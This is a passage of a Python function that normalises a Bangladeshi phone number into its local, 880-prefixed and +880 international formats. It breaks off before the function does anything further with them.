def get_providers(phone_number):
    digits = "".join(filter(str.isdigit, phone_number))
    
    # Format for Bangladesh: 01XXXXXXXXX
    if digits.startswith("880") and len(digits) >= 12:
        local = "0" + digits[3:]  # 01XXXXXXXXX
        full_880 = digits          # 8801XXXXXXXXX
        full_plus = "+" + digits   # +8801XXXXXXXXX
    elif digits.startswith("01") and len(digits) >= 11:
        local = digits[:11]        # 01XXXXXXXXX
        full_880 = "880" + digits[1:]  # 8801XXXXXXXXX
        full_plus = "+880" + digits[1:]  # +8801XXXXXXXXX
    else:
        local = digits[-11:] if len(digits) >= 11 else digits
        full_plus = "+" + digits if not digits.startswith("+") else digits
        full_880 = digits
    
    # Also keep international format without +
    intl = full_880  # 8801XXXXXXXXX
    
